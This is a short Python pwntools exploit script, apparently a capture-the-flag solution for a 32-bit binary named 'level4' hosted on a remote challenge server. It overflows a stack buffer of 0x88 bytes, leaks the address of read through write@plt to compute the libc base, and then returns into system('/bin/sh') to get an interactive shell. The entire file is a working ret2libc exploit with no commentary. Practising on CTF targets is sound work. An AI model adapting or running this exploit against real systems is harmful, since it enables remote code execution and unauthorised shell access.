from pwn import *

#p = process('./level4')
p = remote('node4.buuoj.cn', 27271)
elf = ELF('level4')

vuln_addr = elf.sym['vulnerable_function']
write_plt = elf.plt['write']
read_got = elf.got['read']

#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('libc-2.23.so')

payload = b'a' * ( 0x88 + 4 ) + p32(write_plt) + p32(vuln_addr) + p32(1) + p32(read_got) + p32(4)

p.sendline(payload)

read_real_addr = u32(p.recv(4))

libc_base = read_real_addr - libc.sym['read']

print('[+] libc_base -> {}'.format(hex(libc_base)))

system_addr = libc_base + libc.sym['system']
bin_sh = libc_base + next(libc.search(b'/bin/sh'))

payload = b'a' * ( 0x88 + 4 ) + p32(system_addr) + p32(0x12345678) + p32(bin_sh)

p.sendline(payload)

p.interactive()
